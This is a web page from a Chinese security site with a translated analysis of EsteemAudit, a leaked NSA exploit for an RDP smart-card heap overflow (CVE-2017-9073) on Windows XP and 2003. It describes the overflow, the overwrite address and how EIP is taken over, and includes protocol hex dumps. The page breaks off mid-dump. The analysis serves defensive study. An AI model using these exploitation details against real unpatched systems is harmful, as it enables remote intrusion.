<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】NSA武器库：CVE-2017-9073 EsteemAudit分析 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="NSA,影子经纪人,CVE-2017-9073,EsteemAudit"/>
    
        <meta name="description" content="四月份，影子经纪人黑客团队发布了一部分他们从NSA窃取的漏洞利用工具，主要是针对Windows操作系统。其中最著名就是被想哭勒索蠕虫利用的永恒之蓝。另一个被放出利用工具针对的CVE-2017-9073的漏洞利用代码叫做EsteemAudit，是一个Windows 2003和Windows XP上RDP的利用工具。本文为针对EsteemAudit的分析。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】NSA武器库：CVE-2017-9073 EsteemAudit分析</h2>
                <div class="article-msg">
                    <span class="time">2017-06-05 14:50:26</span>
                    
                                        <span class="read">阅读：19056次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3937"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3937" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="http://researchcenter.paloaltonetworks.com/2017/05/unit42-dissection-esteemaudit-windows-remote-desktop-exploit/"
                             target="_blank">来源： paloaltonetworks.com</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2803578480" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2803578480" style="color:#848e99;">WeaponX</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><img src="http://p2.qhimg.com/t012bba6df9412e9f1e.png" alt="http://p7.qhimg.com/t0140d3569451a770ee.png"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><br/></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">翻译：</span><a href="http://bobao.360.cn/member/contribute?uid=2803578480" target="_blank" textvalue="WeaponX" style="text-decoration: underline; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; color: rgb(0, 112, 192);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; color: rgb(0, 112, 192);"><strong>WeaponX</strong></span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">预估稿费：200RMB</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">背景</span></strong></span><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">四月份，一个名为“影子经纪人”的组织发布了一部分他们从NSA窃取的漏洞利用工具，主要是针对windows操作系统。其中最著名就是被勒索软件WanaCryp0t利用的exploit&quot;EternalBlue&quot;。另一个被放出利用工具针对的CVE-2017-9073叫做&quot;EsteemAudit&quot;，是一个Windows 2003和Windows XP上RDP(Remote Desktop Protocol，远程桌面协议)的利用工具。&quot;EsteemAudit&quot;利用的漏洞影响的操作系统微软均已不再支持(2014年结束对XP的支持，2015年结束对2003的支持)，所以微软官方并没有发布这个漏洞的补丁。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">EsteemAudit 总览</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">RDP远程利用工具名为&quot;EsteemAudit&quot;。使用inter-chunk heap overflow方法。Windows智能卡模块的gpkcsp.dll分配的名为key_set，大小为0x24a8的数据结构。在key_set中有一个名为key_data的数据结构大小0x80，这个内存空间用来存放智能卡相关信息。在相邻的内存空间中中存储着两个key_object指针。然而，在gpkcsp!MyCPAcquireContext中调用了内存拷贝函数memcpy，在没有进行边界检查的情况下拷贝了一块用户可完全控制的数据到key_data中，如果攻击者控制的这块内存大于0x80，则相邻内存的指针key_object将会被用户的恶意数据覆盖。EsteemAudit中的代码通过部署一块0xb2-7大小的内存，利用代码中的memcpy拷贝恶意数据到key_data中，随后key_object会被覆盖为0x080190dc这个地址。这个地址正好在gpkcsp.dll的数据段中，随后EsteemAudit会在这个地址部署恶意数据。exploit会将用户控制的数据放到全局变量中去，地址是0x080190d8，随后函数gpkcsp!ReleaseProvider会释放C++对象call [vatble+8]，这时就控制了EIP。最终，通过使用SharedUserData技术使用syscall调用syscall id为0x8f的函数VirtualProtect修改shellcode内存的执行权限，然后调用shellcode第一阶段就完成了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">介绍</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">RDP远程代码执行漏洞很多，不过幸运的是在NT4/Win98后没有任何利用代码被公开发布。然而在2017年4月，影子经纪人公布出的从NSA窃取工具包含了Windows XP和Windows 2003操作系统上RDP远程代码执行漏洞的利用工具EsteemAudit。在本文中，我们将首先介绍RDP协议的内部机制，随后分析EsteemAudit.exe本身。接着，我们会分析RDP协议在用户态和内核态是如何工作的、inter-chunk heap overflow是如何发生的、如何利用inter-chunk heap overflow在有漏洞的操作系统上来执行shellcode。最终我们会介绍在没有patch的情况下如何防御这个漏洞。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">架构和组件</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><a href="https://technet.microsoft.com/en-us/library/cc755399.aspx" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">终端服务架构</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">主要分为四部分：</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">multi-user kernel</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(227, 108, 9);"><strong><span style="color: rgb(227, 108, 9); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Remote Desktop client</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(227, 108, 9);"><strong><span style="color: rgb(227, 108, 9); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Terminal Services Licensing service</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(227, 108, 9);"><strong><span style="color: rgb(227, 108, 9); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Session Directory Services</span></strong></span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t016c2baef954386295.png" title="t01ce2265051db7df7e.png" alt="http://p8.qhimg.com/t01ce2265051db7df7e.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下表是终端服务的组件及说明</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01d5dce04d212a529a.png" title="t01117b75955c5f1af4.png" alt="http://p6.qhimg.com/t01117b75955c5f1af4.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Nicolas Collignon在论文中</span><a href="http://www.hsc.fr/ressources/presentations/ossir_rdp/rdp2tcp.pdf" target="_self" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Tunneling TCP over RDP</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">描述了各个组件之间的联系。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在内核态，相关的组件在rdpwd.sys中，负责MCS(Multipoint Communication Service)协议栈。RDP PDU(Protocol Data Unit，协议数据单元)在此模块被解密并解析。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在用户态，winlogon组件负责客户端的认证。例如，如果一个客户端请求智能卡认证，winlogon.exe会运行智能卡模块与客户端交互。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">RDP 协议</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">通过对远程桌面服务的简要介绍，我们可以深入了解RDP协议中的被EsteemAudit利用的含有漏洞的模块。在MSDN中有一些RDP的说明文档</span><a href="https://msdn.microsoft.com/en-us/library/jj712081.aspx" _src="https://msdn.microsoft.com/en-us/library/jj712081.aspx" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">https://msdn.microsoft.com/en-us/library/jj712081.aspx</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">。</span><a href="https://msdn.microsoft.com/en-us/library/cc240445.aspx" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[MS-RDPBCGR]: Remote Desktop Protocol: Basic Connectivity and Graphics Remoting</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">介绍了RDP协议的基本情况，</span><a href="https://msdn.microsoft.com/en-us/library/cc242596.aspx" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[MS-RDPESC]: Remote Desktop Protocol: Smart Card Virtual Channel Extension</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">介绍了RDP协议的一些扩展模块。还有一些文档针对指定的扩展模块进行的描述，例如</span><a href="https://msdn.microsoft.com/en-us/library/cc242596.aspx" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[MS-RDPESC]: Remote Desktop Protocol: Smart Card Virtual Channel Extension</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">。在OSSIR 2010中，Aurélien Bordes在他的议题中列出了所有RDP的扩展模块。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了深入分析，我们阅读了如下文档：</span></p><p style="text-indent: 2em; text-align: left;"><a href="https://msdn.microsoft.com/en-us/library/cc240445.aspx" target="_self" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[MS-RDPBCGR] – Remote Desktop Protocol: Basic Connectivity and Graphics Remoting</span></a></p><p style="text-indent: 2em; text-align: left;"><a href="https://msdn.microsoft.com/en-us/library/cc242596.aspx" target="_self" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[MS-RDPESC] – Remote Desktop Protocol: Smart Card Virtual Channel Extension</span></a></p><p style="text-indent: 2em; text-align: left;"><a href="https://msdn.microsoft.com/en-us/library/cc241305.aspx" target="_self" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[MS-RDPEFS] – Remote Desktop Protocol: File System Virtual Channel Extension</span></a></p><p style="text-indent: 2em; text-align: left;"><a href="https://msdn.microsoft.com/en-us/library/cc243560.aspx" target="_self" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[MS-RPCE] – Remote Procedure Call Protocol Extensions.</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">MS-RDPBCGR基于ITU(International Telecommunication Union，国际电信联盟)的</span><a href="https://www.itu.int/rec/T-REC-T.120-200701-I/en" target="_self" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">T.120</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">系列协议。T.120包含很多其他的标准，例如使用X.224标准用来阐述传输层协议如何交互。</span><a href="https://www.itu.int/rec/T-REC-X.224/en" target="_self" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">X.224</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">标准阐述了我们看到的request PDU和Confirm PDU需要使用何种加密方法进行RDP数据包加密。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在下放的示例中，X.224请求中的encryptionMethods标志位被设置成了0x00000012，代表客户端请求使用128-bit的RC4进行加密[128BIT_ENCRYPTION_FLAG 0x00000002]</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t01fb2a49d1a505b11f.png" title="t01ddab157ddd06c0c9.png" alt="http://p0.qhimg.com/t01ddab157ddd06c0c9.png"/></p><p style="text-align:center"><img src="http://p8.qhimg.com/t0176085763224bbc8e.png" title="t01d19ef9a67fcedfee.png" alt="http://p8.qhimg.com/t01d19ef9a67fcedfee.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">服务端在X.224 confirm PDU中设置encryptionMethod标志位0x00000002(128-bit RC4)确认使用128-bit RC4加密。</span></p><p style="text-align:center"><img src="http://p0.qhimg.com/t01cc26724483cb4090.png" title="t019a27203bcc0b1dbd.png" alt="http://p4.qhimg.com/t019a27203bcc0b1dbd.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">本文不再阐述RDP连接过程接下来的步骤，详细文档可在</span><a href="https://msdn.microsoft.com/en-us/library/cc240445.aspx" target="_self" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">[MS-RDPBCGR] – Remote Desktop Protocol: Basic Connectivity and Graphics Remoting</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">进行查阅。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">RDP连接建立完成后，客户端和服务器段的PDU会使用协商的加密算法进行加密。下图是被加密的PDU实例</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t0178b291fa3b53b1dc.png" title="t01ca7993dcbf7861f3.png" alt="http://p4.qhimg.com/t01ca7993dcbf7861f3.png"/></p><p style="text-align:center"><img src="http://p1.qhimg.com/t0105bb6e2195ff130d.png" title="t01934743774cdc781a.png" alt="http://p2.qhimg.com/t01934743774cdc781a.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">PDU中的数据如下</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">64&nbsp;00&nbsp;04&nbsp;03&nbsp;eb&nbsp;70&nbsp;81&nbsp;56&nbsp;-&gt;&nbsp;PER&nbsp;encoded&nbsp;(ALIGNED&nbsp;variant&nbsp;of&nbsp;BASIC-PER)&nbsp;SendDataRequest
initiator&nbsp;=&nbsp;1005&nbsp;(0x03ed)
channelId&nbsp;=&nbsp;1003&nbsp;(0x03eb)
dataPriority&nbsp;=&nbsp;high
segmentation&nbsp;=&nbsp;begin&nbsp;|&nbsp;end
userData&nbsp;length&nbsp;=&nbsp;0x156&nbsp;=&nbsp;342&nbsp;bytes
48&nbsp;00&nbsp;-&gt;&nbsp;TS_SECURITY_HEADER::flags&nbsp;=&nbsp;0x0048&nbsp;0x0048&nbsp;(SEC_INFO_PKT&nbsp;|&nbsp;SEC_ENCRYPT
00&nbsp;00&nbsp;-&gt;&nbsp;TS_SECURITY_HEADER::flagsHi&nbsp;–&nbsp;ignored&nbsp;as&nbsp;flags&nbsp;field&nbsp;does&nbsp;not&nbsp;contain&nbsp;SEC_FLAGSHI_VALID&nbsp;(0x8000)
6f&nbsp;6d&nbsp;0c&nbsp;d5&nbsp;b7&nbsp;0c&nbsp;5d&nbsp;7e&nbsp;-&gt;&nbsp;TS_SECURITY_HEADER1::dataSignature</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">以86 b8 8a a9开始，从偏移为0x51后剩余的数据TS_INFO_PACKET被加密</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">len
0178d254&nbsp;&nbsp;0000014a&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;J…
encrypted
038e3c8b&nbsp;&nbsp;a98ab886&nbsp;dabad90d&nbsp;d9d8f9e3&nbsp;8dd5bafa&nbsp;&nbsp;…………….
038e3c9b&nbsp;&nbsp;1407ea51&nbsp;883cb6af&nbsp;21ca2bdb&nbsp;cab1e030&nbsp;&nbsp;Q…..&lt;..+.!0…
038e3cab&nbsp;&nbsp;d6aaeccd&nbsp;1c599171&nbsp;1be8c40d&nbsp;96d651dc&nbsp;&nbsp;….q.Y……Q..
038e3cbb&nbsp;&nbsp;2d018a22&nbsp;242aac0d&nbsp;7b58948f&nbsp;4be28b23&nbsp;&nbsp;“..-..*$..X{#..K
038e3ccb&nbsp;&nbsp;36cf54c6&nbsp;52b70939&nbsp;4064362b&nbsp;9e37e989&nbsp;&nbsp;.T.69..R+6d@..7.
038e3cdb&nbsp;&nbsp;9ff09b06&nbsp;4f862c80&nbsp;1546198a&nbsp;ac9b03ed&nbsp;&nbsp;…..,.O..F…..
038e3ceb&nbsp;&nbsp;420acbdf&nbsp;566591c1&nbsp;7f471159&nbsp;0e1d6906&nbsp;&nbsp;…B..eVY.G..i..
038e3cfb&nbsp;&nbsp;906474f4&nbsp;476ea91e&nbsp;4db2edd2&nbsp;fb464bfd&nbsp;&nbsp;.td…nG…M.KF.
plain
038e3c8b&nbsp;&nbsp;00000000&nbsp;00000133&nbsp;001a0000&nbsp;00000000&nbsp;&nbsp;….3………..
038e3c9b&nbsp;&nbsp;00000000&nbsp;00640061&nbsp;0069006d&nbsp;0069006e&nbsp;&nbsp;….a.d.m.i.n.i.
038e3cab&nbsp;&nbsp;00740073&nbsp;00610072&nbsp;006f0074&nbsp;00000072&nbsp;&nbsp;s.t.r.a.t.o.r…
038e3cbb&nbsp;&nbsp;00000000&nbsp;00020000&nbsp;0031001c&nbsp;00320039&nbsp;&nbsp;……….1.9.2.
